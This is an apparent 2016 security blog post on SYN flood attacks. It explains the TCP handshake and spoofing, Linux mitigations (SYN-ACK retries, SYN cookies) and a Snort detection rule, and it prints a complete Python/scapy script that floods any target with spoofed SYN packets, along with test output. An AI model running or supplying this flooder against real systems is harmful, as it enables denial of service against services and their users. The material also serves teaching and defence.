<!doctype html><html lang=en><head>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta charset=utf-8>
<meta content="utf-8" http-equiv=encoding>
<link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin>
<link rel=stylesheet href=/css/bootstrap-grid.min.css type=text/css>
<link rel=stylesheet href=/css/main.css type=text/css>
<meta name=apple-mobile-web-app-title content="dubell.io | Creating SYN flood attacks with Python">
<meta name=apple-mobile-web-app-capable content="yes">
<meta name=apple-mobile-web-app-status-bar-style content="black-translucent">
<meta name=twitter:site content="@dubs3c">
<meta name=twitter:creator content="@dubs3c">
<meta property="og:title" content="dubell.io | Creating SYN flood attacks with Python">
<meta name=twitter:title content="dubell.io | Creating SYN flood attacks with Python">
<meta itemprop=name content="dubell.io | Creating SYN flood attacks with Python">
<meta name=application-name content="dubell.io | Creating SYN flood attacks with Python">
<meta property="og:site_name" content="dubell.io">
<meta property="og:article:published_time" content="2016-06-22T00:00:00Z">
<meta property="article:published_time" content="2016-06-22T00:00:00Z">
<base href=https://dubell.io/www/2016/06/creating-syn-flood-attacks-with-python/>
<link rel=canonical href=https://dubell.io/www/2016/06/creating-syn-flood-attacks-with-python/ itemprop=url>
<meta name=url content="https://dubell.io/www/2016/06/creating-syn-flood-attacks-with-python/">
<meta name=twitter:url content="https://dubell.io/www/2016/06/creating-syn-flood-attacks-with-python/">
<meta property="og:url" content="https://dubell.io/www/2016/06/creating-syn-flood-attacks-with-python/">
<meta name=description content>
<meta itemprop=description content>
<meta property="og:description" content>
<meta name=twitter:description content>
<meta itemprop=image content="/">
<meta property="og:image" content="https://dubell.io">
<meta name=twitter:image content="https://dubell.io">
<meta name=twitter:image:src content="https://dubell.io">
<meta property="og:updated_time" content="2016-06-22T00:00:00Z">
<link rel=sitemap type=application/xml title=Sitemap href=https://dubell.io/sitemap.xml>
<title>dubell.io | Creating SYN flood attacks with Python</title>
</head><body>
<div id=particles-js></div>
<main><div class=row>
<div class=col>
<header style=text-align:center>
<a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a>
</header>
</div>
</div>
<div class=row>
<div class=col style=text-align:center>
<nav>
<fieldset>
<legend>n4vig4ti0n</legend>
<ul>
<li><a href=/>/etc/motd</a></li>
<li><a href=/www/>/var/www</a></li>
<li><a href=/mnt/>/mnt</a></li>
<li><a href=/usr/>/usr</a></li>
</ul>
</fieldset>
</nav>
</div>
</div>
<div class=content>
<article>
<h1>Creating SYN flood attacks with Python</h1>
<br>
<p class=small style=color:#999>
<a href=/categories/network-security>Network Security</a> / June 22, 2016 • 10 min read </p>
<br>
<p>Today it&rsquo;s very easy for people to download tools that overwhelm computer systems <em>(denial of service)</em> in order to take them offline. There are different types of attacks that can be used to create a denial of service attack, one of them is the SYN flood attack which this article will cover. I will also show how to develop your own SYN flooder and some protection mitigations.</p>
<h2 id=what-is-a-syn-flood-attack>What is a SYN flood attack?</h2>
<p>The SYN flood attack works by the attacker opening multiple &ldquo;half made&rdquo; connections and not responding to any <code>SYN_ACK</code> packets. In order to understand the SYN flood attack it is vital to understand the TCP 3-way handshake first.</p>
<h3 id=tcp-handshake>TCP handshake</h3>
<p>When a client wants to talk to a server over TCP, the client initiates what is called the <em>3-way handshake</em>. It begins with the client sending a <code>SYN</code> packet to the server, the server receives the packet and responds with a <code>SYN_ACK</code> indicating to the client that it received the initial <code>SYN</code> packet. When the client receives the <code>SYN_ACK</code> it will reply with an <code>ACK</code> packet which now establishes a connection between the client and server and they can begin exchanging data. A visual representation can be seen below.</p>
<p>IMAGE HERE</p>
<h3 id=the-syn-flood-attack>The SYN flood attack</h3>
<p>We now know that clients and servers establishes a connection by completing a handshake with each other, what happens if you do not complete the handshake? By sending multiple <code>SYN</code> packets to the victim and not responding with an <code>ACK</code> message to the victim&rsquo;s <code>SYN_ACK</code> message, the victim will have a multiple &ldquo;half&rdquo; open connections causing the victim&rsquo;s connection table to potentially overflow .</p>
<h3 id=syn-spoofing>SYN spoofing</h3>
<p>An attacker could also spoof the source address of the initial <code>SYN</code> packets causing the victim to send <code>SYN_ACK</code> messages to an other host, which will respond with a <code>RST</code> packet indicating to drop the connection causing the SYN attack to fail. In order for the spoofing to work the attacker needs to select source addresses where there exists no hosts that can respond.</p>
<h2 id=protection>Protection</h2>
<p>There are different ways to limit the effects of SYN flood/spoof attacks, some of are:</p>
<h4 id=remove-random-connections>Remove random connections</h4>
<p>Start deleting random &ldquo;half made&rdquo; connections, this can however delete legitimate connections.</p>
<h4 id=reduce-time-in-syn_received-state>Reduce time in SYN_RECEIVED state</h4>
<p>When you send SYN packet to a server the connection will be placed in a <code>SYN_RECV</code> state and the server will respond with a <code>SYN_ACK</code> packet. The server will resend <code>SYN_ACK</code> a few times until an <code>ACK</code> is received, during this time the connection is still placed in a <code>SYN_RECV</code> state. This means the server needs to keep track of thousands of connections which can overflow the server&rsquo;s connection table. By reducing the <code>SYN_ACK</code> retries the server will close connections placed in a <code>SYN_RECV</code> state earlier which can be very helpful protecting against SYN flood attacks.</p>
<p>In Linux you can edit <strong>/etc/sysctl.conf</strong> and change <code>net.ipv4.tcp_synack_retries</code> from the default value 5 to something lower depending on fast you want your system to close connections in a <code>SYN_RECV</code> state. The default value 5 leaves connections in <code>SYN_RECV</code> state open for 3 minutes and a value of 3 leaves connections open for roughly 45 seconds. After you have modified the file you can make your changes permanent by running <code>sysctl –p /etc/sysctl.conf</code> and verify that is has been changed by:</p>
<pre tabindex=0><code>root@ajax:~# cat /proc/sys/net/ipv4/tcp_synack_retries
1
</code></pre><h4 id=syn-cookies>SYN cookies</h4>
<p>Instead of the server keeping track of states for each connection which allocates memory, we can use SYN cookies instead. When a <code>SYN</code> is received a hash is computed based on meta information. The receiver (server) sends a <code>SYN_ACK</code> with the hash and does not allocate any memory yet, only the hash is stored. The hash consists of the the following:</p>
<pre tabindex=0><code>Initial Sequence Number (ISN) = hash(source_ip, source_port, destination_ip, destination_port, client's ISN, secret)
</code></pre><p>The sender must send an <code>ACK</code> with this hash so that the receiver can compare with the stored hash, if success than allocate memory and data structures.</p>
<p>Enabling SYN cookies in linux is very easy. Edit the file <strong>/etc/sysctl.conf</strong> and make the following modification:</p>
<pre tabindex=0><code>net.ipv4.tcp_syncookies = 1
</code></pre><p>Save and run <code>sysctl -p</code> to make the change permanent.</p>
<h2 id=building-a-simple-syn-flooder-with-python-using-scapy>Building a simple SYN flooder with Python using scapy</h2>
<p>Building your own SYN flooder is not difficult and can easily be done with Python and scapy. Below I have written a simple SYN flooder that will send spoofed SYN packets to any target. The program will send 64511 SYN packets <em>per spoofed IP</em> which means a total of 16 385 794 packets!</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span style=color:#080;background-color:#0f140f;font-style:italic>#!/usr/bin/env python3</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span style=color:#0086d2>&#34;&#34;&#34;Simple SYN Flooder and spoofer
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span style=color:#0086d2> - @mjdubell
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span style=color:#0086d2>
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span style=color:#0086d2>This software is intended for educational purposes and
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span style=color:#0086d2>can only be used against systems with permission from owner.
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span style=color:#0086d2>The user is the only one responsible for any damages. By using this
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span style=color:#0086d2>software you agree with the terms.
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span style=color:#0086d2>
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span style=color:#0086d2>Usage:
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span style=color:#0086d2>  syn_flooder.py &lt;dst_ip&gt; &lt;dst_port&gt; [--sleep=&lt;sec&gt;] [--verbose] [--very-verbose]
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span style=color:#0086d2>
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span style=color:#0086d2>Options:
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span style=color:#0086d2>  -h, --help            Show this screen.
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span style=color:#0086d2>  --version             Show version.
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span style=color:#0086d2>  --sleep=&lt;seconds&gt;     How many seconds to sleep betseen scans [default: 0].
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span style=color:#0086d2>  --verbose             Show addresses being spoofed. [default: False]
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span style=color:#0086d2>  --very-verbose        Display everything. [default: False]
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span style=color:#0086d2>
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span style=color:#0086d2>&#34;&#34;&#34;</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span style=color:#fb660a;font-weight:700>from</span> docopt <span style=color:#fb660a;font-weight:700>import</span> docopt
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span style=color:#fb660a;font-weight:700>import</span> logging
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span style=color:#fb660a;font-weight:700>import</span> signal
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span style=color:#fb660a;font-weight:700>import</span> sys
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span>logging.getLogger(<span style=color:#0086d2>&#34;scapy.runtime&#34;</span>).setLevel(logging.ERROR)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span style=color:#fb660a;font-weight:700>from</span> scapy.all <span style=color:#fb660a;font-weight:700>import</span> *
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>main</span>(arguments):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span>    src_net = <span style=color:#0086d2>&#34;192.168.250.&#34;</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span>    dst_ip = arguments[<span style=color:#0086d2>&#34;&lt;dst_ip&gt;&#34;</span>]
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span>    dst_port = int(arguments[<span style=color:#0086d2>&#34;&lt;dst_port&gt;&#34;</span>])
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span>    sleep = int(arguments[<span style=color:#0086d2>&#34;--sleep&#34;</span>])
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span>    verbose = arguments[<span style=color:#0086d2>&#34;--verbose&#34;</span>]
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span>    very_verbose = arguments[<span style=color:#0086d2>&#34;--very-verbose&#34;</span>]
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span>    signal.signal(signal.SIGINT, <span style=color:#fb660a;font-weight:700>lambda</span> n, f: sys.exit(<span style=color:#0086f7;font-weight:700>0</span>))
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span>    print(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>###########################################&#34;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span>    print(<span style=color:#0086d2>&#34;# Starting Denial of Service attack...&#34;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span>    print(<span style=color:#0086d2>f</span><span style=color:#0086d2>&#34;# Target: </span><span style=color:#0086d2>{</span>dst_ip<span style=color:#0086d2>}</span><span style=color:#0086d2>&#34;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span>    print(<span style=color:#0086d2>&#34;###########################################</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>&#34;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span>    <span style=color:#fb660a;font-weight:700>for</span> src_host in range(<span style=color:#0086f7;font-weight:700>1</span>,<span style=color:#0086f7;font-weight:700>254</span>):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span>        <span style=color:#fb660a;font-weight:700>if</span> verbose or very_verbose:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span>            print(<span style=color:#0086d2>f</span><span style=color:#0086d2>&#34;[*] Sending spoofed SYN packets from </span><span style=color:#0086d2>{</span>src_net<span style=color:#0086d2>}{</span>src_host<span style=color:#0086d2>}</span><span style=color:#0086d2>&#34;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span>            print(<span style=color:#0086d2>&#34;--------------------------------------------&#34;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span>        <span style=color:#fb660a;font-weight:700>for</span> src_port in range(<span style=color:#0086f7;font-weight:700>1024</span>, <span style=color:#0086f7;font-weight:700>65535</span>):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span>            <span style=color:#fb660a;font-weight:700>if</span> very_verbose:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span>                print(<span style=color:#0086d2>f</span><span style=color:#0086d2>&#34;[+] Sending a spoofed SYN packet from </span><span style=color:#0086d2>{</span>src_net<span style=color:#0086d2>}{</span>src_host<span style=color:#0086d2>}</span><span style=color:#0086d2>:</span><span style=color:#0086d2>{</span>src_port<span style=color:#0086d2>}</span><span style=color:#0086d2>&#34;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">53</span>            <span style=color:#080;background-color:#0f140f;font-style:italic># Build the packet</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">54</span>            src_ip = src_net + str(src_host)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">55</span>            network_layer = IP(src=src_ip, dst=dst_ip)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">56</span>            transport_layer = TCP(sport=src_port, dport=dst_port, flags=<span style=color:#0086d2>&#34;S&#34;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">57</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">58</span>            <span style=color:#080;background-color:#0f140f;font-style:italic># Send the packet</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">59</span>            send(network_layer/transport_layer, verbose=<span style=color:#fb660a;font-weight:700>False</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">60</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">61</span>            <span style=color:#fb660a;font-weight:700>if</span> sleep != <span style=color:#0086f7;font-weight:700>0</span>:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">62</span>                time.sleep(sleep)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">63</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">64</span>    print(<span style=color:#0086d2>&#34;[+] Denial of Service attack finished.&#34;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">65</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">66</span><span style=color:#fb660a;font-weight:700>if</span> __name__ == <span style=color:#0086d2>&#39;__main__&#39;</span>:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">67</span>    arguments = docopt(__doc__, version=<span style=color:#0086d2>&#34;SYN Flooder 1.5&#34;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">68</span>    main(arguments)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">69</span>
</code></pre></div><h5 id=project-can-be-found-here-httpsgithubcommjdubellsyn-flooder>Project can be found here: <a href=https://github.com/mjdubell/SYN-Flooder>https://github.com/mjdubell/SYN-Flooder</a></h5>
<p>I ran the program against my debian virtual machine to see if my code worked:</p>
<pre tabindex=0><code>root@ajax:~# netstat -antp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      790/exim4
tcp        0      0 0.0.0.0:58873           0.0.0.0:*               LISTEN      509/rpc.statd
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      500/rpcbind
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      525/sshd
tcp        0      0 192.168.1.93:22         192.168.3.1:2045        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1885        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1828        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1878        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1102        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1090        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1148        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1101        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1129        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1172        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1169        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1173        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1829        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1089        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2056        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2040        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1247        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1153        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1072        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1143        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1881        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1852        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1274        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2057        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1277        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1088        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1880        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1164        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1119        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1860        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1134        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1163        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1115        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1075        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1876        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1250        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1103        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2061        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1186        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1109        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1135        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1883        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1168        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1887        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2066        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1191        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1141        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1827        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1246        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2041        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1892        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2035        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2073        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1255        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1145        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1144        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1151        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1147        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1161        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1890        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1104        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1863        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1194        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1128        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1278        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1259        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1193        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1187        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1851        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1266        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1263        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1251        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1181        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2036        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1895        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1154        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1125        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1182        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2072        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1265        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1257        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1201        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1275        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1116        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1167        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2060        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1877        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1888        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1176        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1884        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1139        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2055        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1137        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1160        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1091        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1098        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2068        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2037        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2071        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2034        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1894        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1156        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1092        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1886        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2064        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1889        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1177        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1107        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1085        SYN_RECV    -
tcp        0  40152 192.168.1.93:22         192.168.1.207:59318     ESTABLISHED 4638/sshd: user [p
tcp6       0      0 ::1:25                  :::*                    LISTEN      790/exim4
tcp6       0      0 :::111                  :::*                    LISTEN      500/rpcbind
tcp6       0      0 :::39185                :::*                    LISTEN      509/rpc.statd
tcp6       0      0 :::22                   :::*                    LISTEN      525/sshd
root@ajax:~#
</code></pre><p>As we can see, there is a lot of connections placed in a <code>SYN_RECV</code> state meaning the virtual machine replied with a <code>SYN-ACK</code> but is waiting for an <code>ACK</code> from the spoofed address. I never ran the program to completion but if had done that, there would be thousands of connections stuck in a <code>SYN_RECV</code> state, potentially causing a denial of service.</p>
<h2 id=detection>Detection</h2>
<p>Using an <strong>Intrusion Detection System</strong> such as Snort, it&rsquo;s possible to detect SYN flood attacks. Since I am running Snort in my network, I decided to create a snort rule to detect when running my SYN flooder program. Below you will find the rule:</p>
<pre tabindex=0><code>alert tcp any any -&gt; 192.168.1.0/24 any ( msg:&quot;Possible SYN flood&quot;; classtype:attempted-dos; sid:1999999; flags:S; flow: stateless; detection_filter: track by_dst, count 50, seconds 10;)
</code></pre><p>This rule will alert every SYN packet during one sampling period of 10 seconds, after the first 50 SYN packets. However this rule may not apply for all network environments. Depending on your needs you may need to increase/decrease the count or amount of seconds.</p>
<h2 id=conclusion>Conclusion</h2>
<p>Protecting against DoS attacks, particular SYN flood attacks with spoofing can be difficult. But there are some security measures that can be taken which will hopefully reduce the effects of a DoS attack. Using SYN cookies, IDS/IPS or simply reducing time spent in <code>SYN_RECV</code> state are all possible methods to stop or reduce DoS attacks.</p>
<p>More information about protecting against SYN flood attacks can be found in the <a href=https://tools.ietf.org/html/rfc4987>RFC 4987</a>. Writing rules for snort: <a href=http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node27.html>http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node27.html</a></p>
</article>
</div><footer>
</footer></main>
<script src=/js/particles.min.js defer></script>
<script src=/js/particles.conf.js defer></script>
<script src=/js/baffle.min.js async></script>
<script src=/js/main.js defer async></script>
</body>
</html>